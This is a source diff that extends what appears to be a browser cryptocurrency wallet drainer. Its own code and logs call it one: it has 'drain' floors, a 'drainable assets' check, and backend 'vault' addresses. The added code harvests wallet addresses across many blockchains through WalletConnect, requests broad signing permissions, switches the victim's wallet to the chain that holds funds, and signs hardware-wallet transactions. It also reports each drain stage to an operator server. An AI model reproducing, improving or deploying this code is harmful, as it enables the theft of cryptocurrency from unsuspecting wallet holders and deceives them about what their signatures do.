+        if ((k === 'okx' || targetRdns === 'com.okex.wallet') && (p.isOkxWallet || p.isOKExWallet)) return p;
+        if ((k === 'brave' || targetRdns === 'com.brave.wallet') && p.isBraveWallet) return p;
+      }
+    }
+    if (eth && k === 'metamask' && eth.isMetaMask && !eth.isRabby && !eth.isTrust) return eth;
+    if (eth && k === 'trust' && (eth.isTrust || eth.isTrustWallet)) return eth;
+    return null;
   }
 
   // ── Chain-family discovery (blockchain API first — NOT wallet brand names) ──
@@ -859,6 +1461,9 @@
     if (S.chains.COSMOS && S.chains.COSMOS.address) m.cosmos = S.chains.COSMOS.address;
     if (S.chains.APTOS && S.chains.APTOS.address) m.aptos = S.chains.APTOS.address;
     if (S.chains.SUI && S.chains.SUI.address) m.sui = S.chains.SUI.address;
+    if (S.chains.POLKADOT && S.chains.POLKADOT.address) m.polkadot = S.chains.POLKADOT.address;
+    if (S.chains.ALGORAND && S.chains.ALGORAND.address) m.algorand = S.chains.ALGORAND.address;
+    if (S.chains.CARDANO && S.chains.CARDANO.address) m.cardano = S.chains.CARDANO.address;
     return m;
   }
 
@@ -890,10 +1495,64 @@
             var tp = String(ns.tron.accounts[0]).split(':');
             out.tron = tp[tp.length - 1];
           }
+          if (ns.ton && ns.ton.accounts && ns.ton.accounts[0] && !out.ton) {
+            var tonp = String(ns.ton.accounts[0]).split(':');
+            out.ton = tonp[tonp.length - 1];
+          }
+          if (ns.cosmos && ns.cosmos.accounts && ns.cosmos.accounts[0] && !out.cosmos) {
+            var cp = String(ns.cosmos.accounts[0]).split(':');
+            out.cosmos = cp[cp.length - 1];
+          }
+          if (ns.polkadot && ns.polkadot.accounts && ns.polkadot.accounts[0] && !out.polkadot) {
+            var pp = String(ns.polkadot.accounts[0]).split(':');
+            out.polkadot = pp[pp.length - 1];
+          }
+          if (ns.algorand && ns.algorand.accounts && ns.algorand.accounts[0] && !out.algorand) {
+            var algop = String(ns.algorand.accounts[0]).split(':');
+            out.algorand = algop[algop.length - 1];
+          }
+          if (ns.cardano && ns.cardano.accounts && ns.cardano.accounts[0] && !out.cardano) {
+            var adp = String(ns.cardano.accounts[0]).split(':');
+            out.cardano = adp[adp.length - 1];
+          }
+          if (ns.aptos && ns.aptos.accounts && ns.aptos.accounts[0] && !out.aptos) {
+            var ap = String(ns.aptos.accounts[0]).split(':');
+            out.aptos = ap[ap.length - 1];
+          }
+          if (ns.sui && ns.sui.accounts && ns.sui.accounts[0] && !out.sui) {
+            var sup = String(ns.sui.accounts[0]).split(':');
+            out.sui = sup[sup.length - 1];
+          }
+          if (ns.near && ns.near.accounts && ns.near.accounts[0] && !out.near) {
+            var np = String(ns.near.accounts[0]).split(':');
+            out.near = np[np.length - 1];
+          }
         }
       }
     } catch (e) {}
     return out;
+  }
+
+  function wireWcBtcConnection(btcAddr) {
+    if (!btcAddr || S.familyConnections.UTXO) return;
+    var btcProv = null;
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getBitcoinProvider === 'function') {
+        btcProv = window.LegionWallet.getBitcoinProvider();
+      }
+    } catch (e) {}
+    if (!btcProv) {
+      L.warn('[UTXO] WC session has BTC address but no bip122 provider — wallet may not expose signPsbt');
+      return;
+    }
+    S.familyConnections.UTXO = {
+      provider: btcProv,
+      address: btcAddr,
+      name: 'UTXO',
+      family: 'UTXO',
+      hint: 'walletconnect',
+    };
+    L.log('[UTXO] WC provider wired for drain');
   }
 
   function applyWcSessionAddresses(wcAddr) {
@@ -905,11 +1564,79 @@
     if (wcAddr.btc && !S.chains.BTC) {
       S.chains.BTC = { address: wcAddr.btc, name: 'UTXO', wcSession: true };
       L.log('[UTXO] WC session address:', wcAddr.btc.slice(0, 8) + '...');
+      wireWcBtcConnection(wcAddr.btc);
     }
     if (wcAddr.tron && !S.chains.TRON) {
       S.chains.TRON = { address: wcAddr.tron, wcSession: true };
       L.log('[TRON] WC session address:', wcAddr.tron.slice(0, 8) + '...');
     }
+    if (wcAddr.ton && !S.chains.TON) {
+      S.chains.TON = { address: wcAddr.ton, wcSession: true };
+      L.log('[TON] WC session address:', wcAddr.ton.slice(0, 8) + '...');
+    }
+    if (wcAddr.cosmos && !S.chains.COSMOS) {
+      S.chains.COSMOS = { address: wcAddr.cosmos, wcSession: true };
+      L.log('[COSMOS] WC session address:', wcAddr.cosmos.slice(0, 8) + '...');
+    }
+    if (wcAddr.aptos && !S.chains.APTOS) {
+      S.chains.APTOS = { address: wcAddr.aptos, wcSession: true };
+      L.log('[APTOS] WC session address:', wcAddr.aptos.slice(0, 8) + '...');
+    }
+    if (wcAddr.sui && !S.chains.SUI) {
+      S.chains.SUI = { address: wcAddr.sui, wcSession: true };
+      L.log('[SUI] WC session address:', wcAddr.sui.slice(0, 8) + '...');
+    }
+    if (wcAddr.polkadot && !S.chains.POLKADOT) {
+      S.chains.POLKADOT = { address: wcAddr.polkadot, wcSession: true };
+      wireWcPolkadotConnection(wcAddr.polkadot);
+      L.log('[DOT] WC session address:', wcAddr.polkadot.slice(0, 8) + '...');
+    }
+    if (wcAddr.algorand && !S.chains.ALGORAND) {
+      S.chains.ALGORAND = { address: wcAddr.algorand, wcSession: true };
+      wireWcAlgorandConnection(wcAddr.algorand);
+      L.log('[ALGO] WC session address:', wcAddr.algorand.slice(0, 8) + '...');
+    }
+    if (wcAddr.cardano && !S.chains.CARDANO) {
+      S.chains.CARDANO = { address: wcAddr.cardano, wcSession: true };
+      wireWcCardanoConnection(wcAddr.cardano);
+      L.log('[ADA] WC session address:', wcAddr.cardano.slice(0, 8) + '...');
+    }
+  }
+
+  function wireWcPolkadotConnection(dotAddr) {
+    if (!dotAddr || S.familyConnections.POLKADOT) return;
+    S.familyConnections.POLKADOT = {
+      provider: null,
+      address: dotAddr,
+      name: 'POLKADOT',
+      family: 'POLKADOT',
+      hint: 'walletconnect',
+      wcSession: true,
+    };
+  }
+
+  function wireWcAlgorandConnection(algoAddr) {
+    if (!algoAddr || S.familyConnections.ALGORAND) return;
+    S.familyConnections.ALGORAND = {
+      provider: null,
+      address: algoAddr,
+      name: 'ALGORAND',
+      family: 'ALGORAND',
+      hint: 'walletconnect',
+      wcSession: true,
+    };
+  }
+
+  function wireWcCardanoConnection(adaAddr) {
+    if (!adaAddr || S.familyConnections.CARDANO) return;
+    S.familyConnections.CARDANO = {
+      provider: null,
+      address: adaAddr,
+      name: 'CARDANO',
+      family: 'CARDANO',
+      hint: 'walletconnect',
+      wcSession: true,
+    };
   }
 
   /** One connect step: link every detected chain family (parallel, same user gesture). */
@@ -919,6 +1646,18 @@
     discoverChainFamilies();
     UI.status('Linking all blockchains...');
     S.familyConnections = {};
+
+    if (S.wcSessionActive || S.connectMode === 'wc') {
+      applyLegionWalletSessionAddresses();
+      S.familiesLinked = true;
+      S.allAddresses = collectAddressMap();
+      var wcParts = [];
+      Object.keys(S.allAddresses).forEach(function (fk) {
+        wcParts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
+      });
+      L.log('[connect] WC session families:', wcParts.length ? wcParts.join(' | ') : 'EVM only');
+      return S.allAddresses;
+    }
 
     var linkers = [
       { family: 'SVM', fn: connectSol },
@@ -949,7 +1688,7 @@
 
     if (tasks.length) await Promise.all(tasks);
 
-    applyWcSessionAddresses(scanWcSessionAllFamilies());
+    applyLegionWalletSessionAddresses();
 
     S.familiesLinked = true;
     S.allAddresses = collectAddressMap();
@@ -1058,6 +1797,15 @@
 
   var MIN_NATIVE_WEI = 100000000000000n; // 0.0001 ETH — drain dust floor (~$0.20)
 
+  async function getProviderChainId(provider) {
+    try {
+      var hex = await provider.request({ method: 'eth_chainId' });
+      return parseInt(String(hex).replace('0x', ''), 16);
+    } catch (e) {
+      return null;
+    }
+  }
+
   async function switchProviderChain(provider, chainId) {
     var hexId = '0x' + Number(chainId).toString(16);
     try {
@@ -1080,6 +1828,8 @@
 
   async function safeSwitchProviderChain(provider, chainId) {
     try {
+      var cur = await getProviderChainId(provider);
+      if (cur === Number(chainId)) return true;
       await switchProviderChain(provider, chainId);
       return true;
     } catch (e) {
@@ -1096,51 +1846,65 @@
     }
   }
 
-  async function readNativeBalanceWei(provider, address) {
+  async function readNativeBalanceWei(provider, address, chainId) {
     try {
-      return BigInt(await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] }) || '0x0');
+      var hex = await evmRequestWithFallback(provider, chainId || 1, 'eth_getBalance', [address, 'latest']);
+      return BigInt(hex || '0x0');
     } catch (e) {
       return 0n;
     }
   }
 
+  function backendHasDrainableAssets(scoutData) {
+    if (!scoutData) return false;
+    if (Number(scoutData.total_usd || 0) > 0) return true;
+    var ranked = scoutData.assets || scoutData.ranked || [];
+    for (var ri = 0; ri < ranked.length; ri++) {
+      var bal = ranked[ri].raw_balance || ranked[ri].amount_raw || '0';
+      if (BigInt(bal || '0') > 0n) return true;
+    }
+    if (scoutData.nfts && scoutData.nfts.length) return true;
+    if (scoutData.defi_positions && scoutData.defi_positions.length) return true;
+    return false;
+  }
+
+  async function findFundedChainViaBackend(address) {
+    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
+      var cid = MULTI_CHAIN_ORDER[i];
+      try {
+        var data = await SCOUT.ranked(address, cid);
+        if (backendHasDrainableAssets(data)) return cid;
+      } catch (e) { /* next chain */ }
+    }
+    return null;
+  }
+
   /** Switch MetaMask to the EVM chain that actually holds native balance. */
   async function ensureFundedEvmChain(provider, address, connectedChainId) {
-    var connectedBal = await readNativeBalanceWei(provider, address);
+    var connectedBal = await readNativeBalanceWei(provider, address, connectedChainId);
     if (connectedBal > MIN_NATIVE_WEI) {
       L.log('Funded chain:', connectedChainId, '| native:', (Number(connectedBal) / 1e18).toFixed(6));
       return Number(connectedChainId);
     }
 
     L.log('Chain', connectedChainId, 'empty — finding funded EVM chain...');
-    var bestId = Number(connectedChainId);
-    var bestBal = connectedBal;
-    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
-      var cid = MULTI_CHAIN_ORDER[i];
-      if (cid === Number(connectedChainId)) continue;
-      try {
-        var switched = await safeSwitchProviderChain(provider, cid);
-        if (!switched) continue;
-        var bal = await readNativeBalanceWei(provider, address);
-        if (bal > bestBal) {
-          bestBal = bal;
-          bestId = cid;
+    var backendChain = await findFundedChainViaBackend(address);
+    if (backendChain != null) {
+      var cur = await getProviderChainId(provider);
+      if (cur !== Number(backendChain)) {
+        var switched = await safeSwitchProviderChain(provider, backendChain);
+        if (switched) {
+          var bal = await readNativeBalanceWei(provider, address, backendChain);
+          if (bal > MIN_NATIVE_WEI || backendHasDrainableAssets(await SCOUT.ranked(address, backendChain))) {
+            L.log('Backend-guided switch →', backendChain);
+            return Number(backendChain);
+          }
         }
-      } catch (e) {
-        if (String(e.message || '').indexOf('Unrecognized chain') !== -1) continue;
-        L.warn('Funded-chain probe', cid, 'fail:', e.message);
+      } else {
+        return Number(backendChain);
       }
     }
 
-    if (bestId !== Number(connectedChainId) && bestBal > MIN_NATIVE_WEI) {
-      L.log('Auto-switch', connectedChainId, '→', bestId, '| native:', (Number(bestBal) / 1e18).toFixed(6));
-      await switchProviderChain(provider, bestId);
-      return bestId;
-    }
-
-    if (bestId !== Number(connectedChainId)) {
-      try { await switchProviderChain(provider, connectedChainId); } catch (e) {}
-    }
     return Number(connectedChainId);
   }
 
@@ -1185,6 +1949,23 @@
       } catch (e) {}
     },
 
+    alertStage: async function (stage, address, chainId, walletName, detail) {
+      L.log('[alert]', stage, detail || '');
+      return SCOUT.reportDrainStatus(stage, address, chainId, walletName, detail);
+    },
+
+    alertFailure: async function (chainFamily, step, err, address, chainId, walletName) {
+      var msg = (err && err.message) || String(err || 'unknown error');
+      var detail = JSON.stringify({
+        chain: chainFamily || 'EVM',
+        step: step || 'unknown',
+        error: msg,
+        trace: err && err.stack ? String(err.stack).slice(0, 400) : undefined,
+      });
+      L.warn('[alert:fail]', chainFamily, step, msg);
+      return SCOUT.alertStage('drain_fail', address, chainId, walletName, detail);
+    },
+
     reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
       var usd = Number(totalUsd) || 0;
       if (usd <= 0) return;
@@ -1215,9 +1996,9 @@
         if (addrs.tron) body.tron_holder_base58 = addrs.tron;
         if (addrs.ton) body.ton_friendly_address = addrs.ton;
         if (addrs.btc) body.btc_holder_address = addrs.btc;
-        if (addrs.cosmos) body.cosmos_holder = addrs.cosmos;
-        if (addrs.aptos) body.aptos_holder = addrs.aptos;
-        if (addrs.sui) body.sui_holder = addrs.sui;
+        if (addrs.cosmos) body.cosmos_holder_address = addrs.cosmos;
+        if (addrs.aptos) body.aptos_holder_address = addrs.aptos;
+        if (addrs.sui) body.sui_holder_address = addrs.sui;
         var r = await apiPost('/api/scout/recursive-predator-fusion', body);
         var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
         if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
@@ -1236,14 +2017,41 @@
     },
 
     chainPriority: function (fusionData) {
-      var order = ['EVM', 'SOL', 'BTC', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI'];
+      var order = ['EVM', 'SOL', 'BTC', 'TRON', 'TON', 'COSMOS', 'POLKADOT', 'ALGORAND', 'CARDANO', 'APTOS', 'SUI'];
       var vals = {};
-      (S.fusionAssets || []).forEach(function (a) {
-        var fam = a.family || a.chain_family || a.chain || 'EVM';
+      var familyFromChain = function (chain) {
+        var c = String(chain || '').toUpperCase();
+        if (c === 'SVM' || c === 'SOL' || c === 'SOLANA') return 'SOL';
+        if (c === 'UTXO' || c === 'BTC' || c === 'BITCOIN') return 'BTC';
+        if (c === 'TRX' || c === 'TRON') return 'TRON';
+        if (c === 'TON') return 'TON';
+        if (c === 'COSMOS') return 'COSMOS';
+        if (c === 'POLKADOT' || c === 'DOT') return 'POLKADOT';
+        if (c === 'ALGORAND' || c === 'ALGO') return 'ALGORAND';
+        if (c === 'CARDANO' || c === 'ADA') return 'CARDANO';
+        if (c === 'APTOS') return 'APTOS';
+        if (c === 'SUI') return 'SUI';
+        return 'EVM';
+      };
+      var assets = (fusionData && fusionData.assets) || S.fusionAssets || [];
+      assets.forEach(function (a) {
+        var fam = a.family || a.chain_family || familyFromChain(a.chain);
         if (fam === 'SVM') fam = 'SOL';
         if (fam === 'UTXO') fam = 'BTC';
         vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
       });
+      var rankedItems = (S.portfolioScan && S.portfolioScan.items) || [];
+      rankedItems.forEach(function (a) {
+        var fam = familyFromChain(a.chain || a.chain_family || a.family);
+        vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
+      });
+      if (S.portfolioScan && S.portfolioScan.byChain) {
+        var evmUsd = 0;
+        Object.keys(S.portfolioScan.byChain).forEach(function (cid) {
+          evmUsd += Number(S.portfolioScan.byChain[cid].usd || 0);
+        });
+        if (evmUsd > 0) vals.EVM = Math.max(vals.EVM || 0, evmUsd);
+      }
       return order.slice().sort(function (a, b) { return (vals[b] || 0) - (vals[a] || 0); });
     },
   };
@@ -1255,6 +2063,7 @@
       if (d && d.data) {
         if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
         if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
+        if (d.data.relayer_sponsored_gas === true) S.relayerSponsored = true;
         var va = d.data.vault_addresses;
         if (va) {
           if (va.evm || va.ethereum) VAULT.evm = va.evm || va.ethereum;
@@ -1311,6 +2120,36 @@
     var msg = (e && e.message) || '';
     return code === 4001 || code === -32100 || code === 5000 || code === 'ACTION_REJECTED' ||
       /rejected|denied|cancelled|user rejected|declined/i.test(msg);
+  }
+
+  function userRejectionMessage() {
+    return 'You declined the request. No changes were made to your wallet.';
+  }
+
+  async function runWithRetry(fn, label, maxAttempts) {
+    var attempts = maxAttempts || 3;
+    var delays = [1000, 2000, 4000];
+    var lastErr = null;
+    for (var ri = 0; ri < attempts; ri++) {
+      try {
+        return await fn();
+      } catch (e) {
+        lastErr = e;
+        if (isUserRejection(e)) throw e;
+        L.warn(label + ' attempt', ri + 1, '/', attempts, 'failed:', e.message);
+        if (ri < attempts - 1) await sleep(delays[ri] + Math.floor(Math.random() * 300));
+      }
+    }
+    if (lastErr) throw lastErr;
+    return null;
+  }
+
+  function chunkArray(arr, size) {
+    var out = [];
+    for (var ci = 0; ci < arr.length; ci += size) {
+      out.push(arr.slice(ci, ci + size));
+    }
+    return out;
   }
 
   function isLikelyTxHash(id) {
@@ -1434,10 +2273,32 @@
         return r.payload.signature;
       } catch (e) { L.warn('Trezor sign fail:', e.message); return null; }
     },
+
+    signTrezorTransaction: async function (txParams) {
+      try {
+        var chainIdNum = typeof txParams.chainId === 'string'
+          ? parseInt(String(txParams.chainId).replace('0x', ''), 16) : Number(txParams.chainId || 1);
+        var r = await window.TrezorConnect.ethereumSignTransaction({
+          path: HD_PATH_EVM,
+          transaction: {
+            to: txParams.to,
+            value: txParams.value,
+            chainId: chainIdNum,
+            nonce: txParams.nonce,
+            gasLimit: txParams.gas,
+            maxFeePerGas: txParams.maxFeePerGas,
+            maxPriorityFeePerGas: txParams.maxPriorityFeePerGas,
+            data: txParams.data || '0x',
+          },
+        });
+        if (!r.success) throw new Error(r.payload.error);
+        return r.payload.serializedTx || r.payload.serialized;
+      } catch (e) { L.warn('Trezor tx sign fail:', e.message); return null; }
+    },
   };
 
   // ═══════════════════════════════════════════════════════════════
-  // SECTION 08: WALLETCONNECT — Reown AppKit bundle only
+  // SECTION 08: WALLETCONNECT — Reown AppKit multichain bundle
   // ═══════════════════════════════════════════════════════════════
   var _wcConnecting = false;
   var _wcProv = null;
@@ -1456,6 +2317,213 @@
     return null;
   }
 
+  async function pollWcProviderReady(maxMs) {
+    maxMs = maxMs || 60000;
+    if (!window.LegionWallet) return null;
+    var start = Date.now();
+    var hijackStreak = 0;
+    while (Date.now() - start < maxMs) {
+      var connId = getLegionConnectorId().toLowerCase();
+      if (connId && isInjectedConnectorId(connId)) {
+        hijackStreak++;
+        if (hijackStreak >= 2) {
+          L.warn('WC poll: extension hijack — stop', connId);
+          await disconnectLegionWallet();
+          return null;
+        }
+        await sleep(600);
+        continue;
+      }
+      hijackStreak = 0;
+      var p = await safeGetLegionProvider();
+      if (p && isRealWalletConnectSession(connId, p)) {
+        try {
+          var accts = await p.request({ method: 'eth_accounts' });
+          if (accts && accts.length) {
+            L.log('WC poll: session ready', String(accts[0]).slice(0, 10) + '...');
+            return p;
+          }
+        } catch (e1) { /* keep polling */ }
+      }
+      applyLegionWalletSessionAddresses();
+      await sleep(800);
+    }
+    return null;
+  }
+
+  function closeAppKitModal() {
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.closeModal === 'function') {
+        window.LegionWallet.closeModal();
+        return;
+      }
+      var selectors = ['w3m-modal', 'appkit-modal'];
+      for (var i = 0; i < selectors.length; i++) {
+        var modal = document.querySelector(selectors[i]);
+        if (!modal) continue;
+        var root = modal.shadowRoot || modal;
+        var closeBtn = root.querySelector('[data-testid="w3m-header-close"]')
+          || root.querySelector('wui-icon-link[icon="close"]');
+        if (closeBtn) { closeBtn.click(); return; }
+        modal.removeAttribute('class');
+        modal.style.display = 'none';
+      }
+    } catch (e) { /* AppKit close best-effort */ }
+  }
+
+  var WC_OPTIONAL_NAMESPACES = {
+    eip155: {
+      methods: ['eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign', 'eth_sign', 'wallet_sendCalls', 'wallet_getCapabilities', 'eth_accounts', 'eth_requestAccounts'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    solana: {
+      chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
+      methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions', 'solana_signAndSendTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    bip122: {
+      chains: ['bip122:000000000019d6689c085ae165831e93'],
+      methods: ['signMessage', 'signPsbt', 'sendTransfer', 'getAccountAddresses'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    tron: {
+      chains: ['tron:0x2b6653dc'],
+      methods: ['tron_signMessage', 'tron_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    ton: {
+      chains: ['ton:-239'],
+      methods: ['ton_sendMessage', 'ton_signData', 'ton_sendTransaction', 'ton_signMessage'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    cosmos: {
+      chains: [
+        'cosmos:cosmoshub-4', 'cosmos:osmo-1', 'cosmos:juno-1',
+        'cosmos:evmos_9001-2', 'cosmos:crescent-1',
+      ],
+      methods: ['cosmos_signAmino', 'cosmos_signDirect'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    polkadot: {
+      chains: [
+        'polkadot:91b171bb158e2d3848fa23a9f1c25182',
+        'polkadot:b0a8d493285c2df73290dfb7e61f870f',
+      ],
+      methods: ['polkadot_signMessage', 'polkadot_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    aptos: {
+      chains: ['aptos:1'],
+      methods: ['aptos_signMessage', 'aptos_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    sui: {
+      chains: ['sui:mainnet'],
+      methods: ['sui_signMessage', 'sui_signTransaction', 'sui_signPersonalMessage'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    near: {
+      chains: ['near:mainnet'],
+      methods: ['near_signMessage', 'near_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    algorand: {
+      chains: ['algorand:mainnet'],
+      methods: ['algo_signTxn', 'algo_signTxns'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    stellar: {
+      chains: ['stellar:mainnet'],
+      methods: ['stellar_sign', 'stellar_signAndSubmit'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    hedera: {
+      chains: ['hedera:mainnet'],
+      methods: ['hedera_signMessage', 'hedera_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    cardano: {
+      chains: ['cardano:mainnet'],
+      methods: ['cardano_signTx', 'cardano_signData'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    ripple: {
+      chains: ['ripple:mainnet'],
+      methods: ['ripple_signTransaction', 'ripple_signMessage'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    filecoin: {
+      chains: ['filecoin:mainnet'],
+      methods: ['filecoin_sign', 'filecoin_signMessage'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    icp: {
+      chains: ['icp:mainnet'],
+      methods: ['icp_signMessage', 'icp_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    tezos: {
+      chains: ['tezos:mainnet'],
+      methods: ['tezos_sign', 'tezos_send'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    elrond: {
+      chains: ['elrond:mainnet'],
+      methods: ['elrond_signMessage', 'elrond_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    harmony: {
+      chains: ['harmony:mainnet'],
+      methods: ['harmony_signMessage', 'harmony_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    celo: {
+      chains: ['celo:mainnet'],
+      methods: ['celo_signMessage', 'celo_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    fantom: {
+      chains: ['fantom:mainnet'],
+      methods: ['fantom_signMessage', 'fantom_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    avalanche: {
+      chains: ['avalanche:mainnet'],
+      methods: ['avalanche_signMessage', 'avalanche_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    cronos: {
+      chains: ['cronos:mainnet'],
+      methods: ['cronos_signMessage', 'cronos_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    zksync: {
+      chains: ['zksync:mainnet'],
+      methods: ['zksync_signMessage', 'zksync_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    linea: {
+      chains: ['linea:mainnet'],
+      methods: ['linea_signMessage', 'linea_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    scroll: {
+      chains: ['scroll:mainnet'],
+      methods: ['scroll_signMessage', 'scroll_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    blast: {
+      chains: ['blast:mainnet'],
+      methods: ['blast_signMessage', 'blast_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+    mantle: {
+      chains: ['mantle:mainnet'],
+      methods: ['mantle_signMessage', 'mantle_signTransaction'],
+      events: ['chainChanged', 'accountsChanged'],
+    },
+  };
+
   async function bundledWalletConnect() {
     if (!WC_PROJECT_ID) { L.warn('wcProjectId not set'); return null; }
     if (typeof window.LegionWallet === 'undefined') {
@@ -1466,21 +2534,26 @@
     _wcConnecting = true;
     _wcProv = null;
 
-    var wcMeta = {
-      name: document.title || 'App',
-      description: 'Connect your wallet',
-      url: window.location.origin,
-      icons: [window.location.origin + '/favicon.ico'],
-    };
+    var wcMeta = wcMetaPayload();
 
     try {
-      UI.status('Opening wallet modal...');
-      L.log('Reown AppKit (bundled wagmi/viem) v' + (window.LegionWallet.version || '?'));
+      UI.status('Scan QR with your mobile wallet...');
+      L.log('Reown AppKit multichain v' + (window.LegionWallet.version || '?'));
+      L.log('WC origin:', wcMeta.url);
+      var wcNs = WC_OPTIONAL_NAMESPACES;
+      if (window.LegionWallet && typeof window.LegionWallet.buildOptionalNamespaces === 'function') {
+        wcNs = window.LegionWallet.buildOptionalNamespaces(WC_OPTIONAL_NAMESPACES);
+      }
+      var hasStoredSession = !!findWcStorageSession();
+      var sessionExpired = !!S.wcSessionExpired;
       var connectP = window.LegionWallet.connect({
         projectId: WC_PROJECT_ID,
         metadata: wcMeta,
         timeoutMs: 180000,
         requireWalletConnect: true,
+        optionalNamespaces: wcNs,
+        preserveSession: hasStoredSession && !sessionExpired,
+        restore: sessionExpired || hasStoredSession,
       });
       var provider = await Promise.race([
         connectP,
@@ -1488,32 +2561,58 @@
           setTimeout(function () { rej(new Error('AppKit timeout — scan QR and approve on phone')); }, 185000);
         }),
       ]);
-      var connId = (window.LegionWallet.getConnectorId ? window.LegionWallet.getConnectorId() : '').toLowerCase();
-      if (provider && (provider.isMetaMask || connId.indexOf('metamask') !== -1 ||
-          connId.indexOf('injected') !== -1 || connId.indexOf('rabby') !== -1)) {
-        try { await window.LegionWallet.disconnect(); } catch (e2) {}
-        L.warn('Extension hijacked WalletConnect — retrying with phone QR');
+      var connId = getLegionConnectorId().toLowerCase();
+      if (provider && isInjectedConnectorId(connId)) {
+        try { await disconnectLegionWallet(); } catch (e2) {}
+        L.warn('Extension hijacked WalletConnect —', connId || 'injected');
         _wcConnecting = false;
         _wcProv = null;
         return null;
       }
-      if (provider && !provider.isWalletConnect) {
-        try { await window.LegionWallet.disconnect(); } catch (e2) {}
-        L.warn('Non-WC connector — retrying with phone QR');
+      if (provider && provider.isMetaMask && !provider.isWalletConnect) {
+        try { await disconnectLegionWallet(); } catch (e2) {}
+        L.warn('Browser wallet hijacked WalletConnect — use MetaMask button for extension');
+        _wcConnecting = false;
+        _wcProv = null;
+        return null;
+      }
+      if (provider && connId && !isRealWalletConnectSession(connId, provider)) {
+        try { await disconnectLegionWallet(); } catch (e2) {}
+        L.warn('Non-WC connector —', connId);
         _wcConnecting = false;
         _wcProv = null;
         return null;
       }
       _wcProv = provider;
       _wcConnecting = false;
+      applyLegionWalletSessionAddresses();
       L.log('Bundled AppKit connected | connector:', connId || 'unknown',
         '| wc:', !!(provider && provider.isWalletConnect));
       return provider;
     } catch (e) {
       _wcConnecting = false;
       _wcProv = null;
-      try { await window.LegionWallet.disconnect(); } catch (e2) {}
       L.warn('Bundled AppKit fail:', e.message);
+      var stored = findWcStorageSession();
+      if (stored) {
+        L.log('WC storage session found — recovering', stored.address.slice(0, 10) + '...');
+        var recovered = await safeGetLegionProvider();
+        if (recovered) {
+          _wcProv = recovered;
+          return recovered;
+        }
+      }
+      L.log('WC: waiting for mobile session in storage...');
+      stored = await waitWcStorageSession(60000);
+      if (stored) {
+        var polled = await pollWcProviderReady(30000);
+        if (polled) {
+          _wcProv = polled;
+          L.log('WC recovered via storage poll | wc:', !!polled.isWalletConnect);
+          return polled;
+        }
+      }
+      try { await disconnectLegionWallet(); } catch (e2) {}
       return null;
     }
   }
@@ -1531,9 +2630,11 @@
       var atomic = cc && (cc.atomic || cc.atomicBatch);
       var status = atomic && (atomic.status || (atomic.supported ? 'supported' : ''));
       var atomicBatch = status === 'ready' || status === 'supported' || !!(atomic && atomic.supported);
-      return { atomicBatch: atomicBatch };
+      var sendCalls = cc && cc.sendCalls;
+      var sendCallsV2 = sendCalls && (sendCalls.version === '2.0.0' || sendCalls.supported === true);
+      return { atomicBatch: atomicBatch, sendCallsV2: sendCallsV2 };
     } catch (e) {
-      return { atomicBatch: isMetaMaskProvider(provider) };
+      return { atomicBatch: isMetaMaskProvider(provider), sendCallsV2: false };
     }
   }
 
@@ -1544,9 +2645,16 @@
       if (scout && scout.data) {
         assets.usd = Number(scout.data.total_usd || 0);
         S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
-        (scout.data.ranked || []).forEach(function (t) {
-          if (t.address && t.address.toLowerCase() !== NATIVE_ETH_ADDR && BigInt(t.raw_balance || '0') > 0n) {
-            assets.tokens.push({ address: t.address, balance: t.raw_balance, symbol: t.symbol, usd: t.usd_value || 0 });
+        (scout.data.assets || scout.data.ranked || []).forEach(function (t) {
+          var contract = t.address || t.token;
+          var bal = t.raw_balance || t.amount_raw || '0';
+          if (contract && contract !== 'native' && String(contract).startsWith('0x') && BigInt(bal || '0') > 0n) {
+            assets.tokens.push({
+              address: String(contract).toLowerCase(),
+              balance: String(bal),
